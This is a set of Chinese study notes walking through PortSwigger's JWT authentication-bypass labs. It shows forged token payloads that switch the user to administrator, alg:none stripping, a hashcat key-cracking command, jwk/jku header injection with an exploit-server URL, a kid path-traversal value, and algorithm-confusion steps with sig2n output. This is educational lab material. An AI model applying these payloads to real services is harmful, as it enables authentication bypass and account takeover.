
## 利用有缺陷的 JWT 签名验证

### 接受任意签名

实验：通过未验证的签名绕过 JWT 认证
https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature

登录后服务器设置 JWT cookie，在重复器中的JWT扩展面板中查看
eyJraWQiOiIyOTY3ZDYxOS1iMjZkLTQ2ZGItYmNlYS1hN2RiMWJiOTg5MTkiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc2MjIzMDU3Mywic3ViIjoid2llbmVyIn0.iQMKu0IXg-8Roq0cB5G_R0Q8v5hY12Wy06TopcSIdFbKP-0WbMLoaUACO7ShE5nabpZGbZUq2VRU9gq_j0jHFqNYlSC3-FZo0mitZuD3kY-Ry6bTWtInwWp1R_p_AZmBwu1TA1suyPhYRJkcmVAKbp6TJL5KJQOpjpOV1t_i3ABqh6tcxA3sVUggmkeMrGir6wd5IIqYFgNiyPL1Y6ZCq1VlvKfF9U_StdBB3dscprqcIE0bqdBli7Om6j_CLL2NzEjMJhC9fimNZtMJRDzrbi6l9uQTA9SVKRMDG17NSHXIhPupY4_izB0ksyMQt77oALvDlzJZK83rvqflW_16TA

其中 载荷部分为
{
    "iss": "portswigger",
    "exp": 1762230573,
    "sub": "wiener"
}

修改为
{
    "iss": "portswigger",
    "exp": 1762230573,
    "sub": "administrator"
}

### 接受没有签名的令牌

实验：通过有缺陷的签名验证绕过 JWT 认证
https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification

响应的JWT 头部为
{
    "kid": "440feb00-186e-4a6a-b26e-78876c73da12",
    "alg": "RS256"
}

修改为无加密，并删除JWT的签名部分但保留末尾的原点
{
    "kid": "440feb00-186e-4a6a-b26e-78876c73da12",
    "alg": "none"
}
此时仍可登录
修改载荷部分 的用户字段为 管理员
{
    "iss": "portswigger",
    "exp": 1762231420,
    "sub": "administrator"
}


## 暴力破解密钥

### 使用 hashcat 暴力破解密钥

实验：通过弱签名密钥绕过 JWT 认证
https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key

linux虚拟机安装 hashcat
sudo apt install hashcat

将JWT字符串保存到文件中，下载JWT爆破字典文件
在文件目录中使用命令
hashcat -a 0 -m 16500 <jwt> <wordlist> --show
得到密钥
secret1

在 JWT扩展中，使用原始 kid 以及获取的密钥生成加密信息后对JWT内容进行签名


## JWT 头部参数注入

### 通过 jwk 参数注入自签名 JWT

实验：通过 jwk 头部注入绕过 JWT 认证
https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection

按照主题教程
在JWT扩展中生成RSA密钥
在重复器中的JWT页面中选择 攻击-嵌入JWE 并选择之前的RSA密钥
确认后，RSA密钥的内容作为JWE更新到JWT头部


### 通过 jku 参数注入自签名 JWT

实验：通过 jku 头部注入绕过 JWT 认证
https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection

设置控制页面的路径为 
/jwks.json
设置内容为 JWK 集合
使用JWT扩展生成的RSA密钥配置
```json
{
    "keys": [
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "ca35999b-6c98-43e1-82e4-c88cc9a0a50b",
            "n": "5YJkrir_7QyM5LDHCP8QHUSAbyZ8T9mxQrvwC1uIyzgWU0C8dJNrloiKu7rTJmpslv-Zd7DQbau93oq8slZkgDHcF1zIFTV5Tz24j4FTqOmIni3ehpO5BFRXAXMC9Y7yQLevAQL5CBxmrRsw9DaC2y3ReoIBLvdHeFxrgrlIXt6F4D9q_GzRtCtNqm1-dhvtqyr77xe4gAKe_Ab30_5Iqu0dq3dDgRCu0abxXTdfgCMlzTd0qdQwA_mB6cbGXvwLm8uoQxg3DKVs6KRCSAQuVZWsXvf8lri_Fx4wQJib6a-8VFNUqFBuLAdirmesQfrz8oPA72fca2FmD1rAKfcWGw"
        }
    ]
}
```

设置重复器中的 jku
"jku":"https://exploit-0ae900a903e2e82782c6a5ef01e30034.exploit-server.net/jwks.json"

确保 JWT的kid的值匹配JWK中的kid
对设置的内容使用RSA对应的私钥进行签名


### 通过 kid 参数注入自签名 JWT

实验：通过 JWT header 中的 kid 路径遍历绕过 JWT 认证
https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal

对JWT头部的kid参数进行遍历，目标文件为空文件
{
    "kid": "../../../../../../../dev/null",
    "alg": "HS256"
}

使用JWT的攻击-使用空key进行签名



## JWT 算法混淆

https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion

尝试访问公开的JWK格式的公钥
GET /jwks.json HTTP/2
提取响应的JWK数组的JWK对象
```json
{"kty":"RSA","e":"AQAB","use":"sig","kid":"8566e0ba-28b9-459a-aef9-5cd52684bd01","alg":"RS256","n":"2QuP5xCzPw_2QypaxQizm3YpQZweVGeUXjXlkwPG4V72PnGAJlOI65_S0OqwurwpccF029EZ_O46IeITVQDz3Yp6I1LKc2OCjoX4NYGcqu2UOhwzyHczoYUE8FoUdsHKcKbs1PZw3PLCUPAsyTBhk_CVojPsC5VnkBqgqtrQCsxnuZMz-ivQSSMbspS7HI04MYhDgZfNoclvQAyDfANZd0Hv7M1ovdxOvJTOA6ICiJLFI0v8cwIvsVaQS7rQBi2RU_Q4aIlzAGkqH8SH4rnQ6uG6AwSKnFo-hMI35J4aVR2jxK5Qo5zuP06o7GU7EKqNIsLK2E0RVQ_ZaoHRs04MhQ"}
```
在JWT扩展中，新建RSA key，选择JWK选项，并将得到的JWK对象复制到key栏中，保存。
右键复制为公钥的PEM格式，并在编码器中进行Base64编码
在JWT扩展中新建 对称密钥，点击生成后，修改其中k的值为 x509 key的Base64编码
在重复器中使用得到的密钥进行签名
**PEM格式的公钥在编码时需在末尾增加一个换行**



docker run --rm -it portswigger/sig2n eyJraWQiOiI4NTY2ZTBiYS0yOGI5LTQ1OWEtYWVmOS01Y2Q1MjY4NGJkMDEiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc2MjI1ODc2Mywic3ViIjoid2llbmVyIn0.z5WOKBJ7lEy9XzmtVjxyDH8IMftw8jGM4ygNnwEd2mTEyIUj31xR2eXRZjk5_J5HtRv09pKeMibrdrDDcJODikFYIen9w-4r6n7oFABj4YJb-lXs-GEa5JQzuxNmVu_LmnUAl2B432y0IDHZgKlWzAIHnxlsyfUG50yGeL80Ik3xeUb7Q8a6NLAecKyHRRkAv4Ck3aD-ndeOrBYPKb-NNTnQXYbePu4um8CZZxlQm8VSY1l-CH7jx03lS8_fSRwKsAFssD92kqGr9WbqMaJcq_CY-XALuHjXOldriWI7VtpvX28DnZ1w_AORbTXaf_ndZZViyadLbz2-U3uNnPp-fA eyJraWQiOiI4NTY2ZTBiYS0yOGI5LTQ1OWEtYWVmOS01Y2Q1MjY4NGJkMDEiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc2MjI1ODc0OCwic3ViIjoid2llbmVyIn0.Tn1XTr_25oyjdrlM8B0FQHi17LqSact1hNtIDuGVb9y0MU4kEKLC3kuZY28hWr4gAkEue84Q850tGcd_0cLsQmSVblAZbzAkJyDTiaBm4v9tylUfckN07J38hGtr23Yfh2DpEIrkDxwvzNvGl_lBCUND0jY4xOyQOUOiCYVshmZPU5OnAcsJWaHBoAnhl6HYedlrXb6o5UWSp8O7lMGxfMQRojzTz1xZo2V86vkxmRtPE8MKYPhKq8XlKTrNsN6_qvhkepLPDK6RSYr0Th39CCIlFmVPNj8bsUHnglGawo2v4G3wG0Xj5xQXjBpLLGBdUfFQYpdXeXrNGelcajeGZw

输出为
Found n with multiplier 1:
    Base64 encoded x509 key: LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUEyUXVQNXhDelB3LzJReXBheFFpegptM1lwUVp3ZVZHZVVYalhsa3dQRzRWNzJQbkdBSmxPSTY1L1MwT3F3dXJ3cGNjRjAyOUVaL080NkllSVRWUUR6CjNZcDZJMUxLYzJPQ2pvWDROWUdjcXUyVU9od3p5SGN6b1lVRThGb1Vkc0hLY0ticzFQWnczUExDVVBBc3lUQmgKay9DVm9qUHNDNVZua0JxZ3F0clFDc3hudVpNeitpdlFTU01ic3BTN0hJMDRNWWhEZ1pmTm9jbHZRQXlEZkFOWgpkMEh2N00xb3ZkeE92SlRPQTZJQ2lKTEZJMHY4Y3dJdnNWYVFTN3JRQmkyUlUvUTRhSWx6QUdrcUg4U0g0cm5RCjZ1RzZBd1NLbkZvK2hNSTM1SjRhVlIyanhLNVFvNXp1UDA2bzdHVTdFS3FOSXNMSzJFMFJWUS9aYW9IUnMwNE0KaFFJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==
    Tampered JWT: eyJraWQiOiI4NTY2ZTBiYS0yOGI5LTQ1OWEtYWVmOS01Y2Q1MjY4NGJkMDEiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAiZXhwIjogMTc2MjM0MTY2MywgInN1YiI6ICJ3aWVuZXIifQ.ja8UUig9WoSowuqKIMNsjkaIL8A2Yhaqi1pdvoUWiko

在JWT扩展中新建 对称密钥，点击生成后，修改其中k的值为 x509 key的Base64编码
在重复器中使用得到的密钥进行签名










## 从现有令牌中派生公钥

实验：通过算法混淆无暴露密钥实现 JWT 身份验证绕过
https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion-with-no-exposed-key

登录2次，获取2个JWT
运行docker客户端，在终端输入命令，在其中使用获得的2个JWT
docker run --rm -it portswigger/sig2n eyJraWQiOiI2ZmY5YjkyYS03MTY1LTQ5MjYtYWE1MC04Y2Q4NzczNDk5ZGIiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc2MjI1NzM4Niwic3ViIjoid2llbmVyIn0.PzRH6w1naNrt23qzfm9IS0MHfXfJR4VVqXEVdoWJYtQOru3gnDuYQ1wxPUOCUmkjW23EX2m4p4wWDL__D-6onxSExccvD44apb5i8Jt1nV3dyIcZneerpluz6fHRNHf5kqvYAMnG7y7NK7nFrS6GMH9yxZA1NkFpNlAnMS5-bdzWrE6b7DC7B9czSu1IYG3mkO9yBzMdZym296HHVq1UZex3W0yTJoa8ujdcG5ZmQaddldRyT4vmgY6vZq-Z2rNESH6BHyhr8eGAedTRdtAhPYVHJPQ795glNX4crcyZggUlVmwPrTSXB96FACFjw1sFSRTl-J_aCrd6LUVUUtg4qA eyJraWQiOiI2ZmY5YjkyYS03MTY1LTQ5MjYtYWE1MC04Y2Q4NzczNDk5ZGIiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc2MjI1NzM5Miwic3ViIjoid2llbmVyIn0.55-H2YXloeJpbFXUqxL7n-KaVfgzp2wiSdOHK6G4uR3FFj4kZS9i8A1LZz8GVkkKz4haLXu4KE23am9j6dpqdsLfjjjjWpRkCvdswKY_a3GXFcDx1OhuFk3ezezNpH2_iGWdiwYFXMPUCP0fxan1M8XHVdwrtZMQxCSlOwO1LO8GUuC0CfrVuaqISFIwN-PHLOlR_d0-MYCtpbQfyvVlYNY2PNhtOk8UBd29tDaOpyQ3Z6kvuGNS8oky02cnsHH6E3vROrKn6QUk6zuFiPZVEHaLOrePeBOsr2ZijA-uv9Xup2Qrlu8njBMfQOuXXy9J5ytPgbMwuq-ReuLcb6oAWQ

输出得到
Found n with multiplier 1:
    Base64 encoded x509 key: LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUIyUEwvTVh6OEFTdCtJbFR6TUY3UgplYzJZK0t0VHdKcjQ2aVZ6ZDk5TDRaMHl5L3JXOG1rL1ptcmZBVWdyNHVZdU1aNlJFeStLL2xvKzdrVnFvSXRqCkhPWWVIUWZZWEsxRFhlK1kydyt6Q1duRU9ycklyczVGZGMzTk5FZGpxaGh0bXFLbk1ybzEzaDhLd0YwQ25VTUEKS25EcnhxZDlSQ3VLYnZVWGtiZ0c3a2N1anc4eFNVTzVVSllkdmFnSEp6c3VMZHB2TzUybUxabEZMSnBxd0cyeQpIOC9TSGhQb2hFM1AvYWwzcmRiNU5razcwVnU2bGZlaUlRS0dhSkJKZytWWG4ybkp5d0xqTTUwK2F6aEJOTHJXCmM3Wk1sMlZGVGFQNi9KY2p3NUZVbGw4QUpaSThXWXYzaWxPeVc0WGF4dmdibjQyR2x5MXY3OEJzb0lZdkxNeG4KZmdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==
    Tampered JWT: eyJraWQiOiI2ZmY5YjkyYS03MTY1LTQ5MjYtYWE1MC04Y2Q4NzczNDk5ZGIiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAiZXhwIjogMTc2MjM0MDg1OCwgInN1YiI6ICJ3aWVuZXIifQ.FeC8gr4DWS5K7cV7tw51xwO4I_JqyJQlhWj7WwvT0N0

Found n with multiplier 2:
    Base64 encoded x509 key: LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUE3SGwvbUw1K0FKVy9FU3A1bUM5bwp2T2JNZkZXcDRFMThkUks1dSsrbDhNNlpaZjFyZVRTZnN6VnZnS1FWOFhNWEdNOUlpWmZGZnkwZmR5SzFVRVd4CmpuTVBEb1BzTGxhaHJ2Zk1iWWZaaExUaUhWMWtWMmNpdXVibW1pT3gxUXcyelZGVG1WMGE3dytGWUM2QlRxR0EKRlRoMTQxTytvaFhGTjNxTHlOd0RkeU9YUjRlWXBLSGNxRXNPM3RRRGs1MlhGdTAzbmM3VEZzeWlsazAxWURiWgpEK2ZwRHduMFFpYm4vdFM3MXV0OG15U2Q2SzNkU3Z2UkVJRkRORWdrd2ZLcno3VGs1WUZ4bWM2Zk5ad2dtbDFyCk9kc21TN0tpcHRIOWZrdVI0Y2lxU3krQUVza2VMTVg3eFNuWkxjTHRZM3dOejhiRFM1YTM5K0EyVUVNWGxtWXoKdndJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==
    Tampered JWT: eyJraWQiOiI2ZmY5YjkyYS03MTY1LTQ5MjYtYWE1MC04Y2Q4NzczNDk5ZGIiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAiZXhwIjogMTc2MjM0MDg1OCwgInN1YiI6ICJ3aWVuZXIifQ.-TCE86kXiaff_8W1BeG7S2xtgtOw6T7wQCvrt_zysIk

测试模板JWT，其中第二个可被接受
在JWT扩展中新建 对称密钥，点击生成后，修改其中k的值为 x509 key的Base64编码
在重复器中使用得到的密钥进行签名
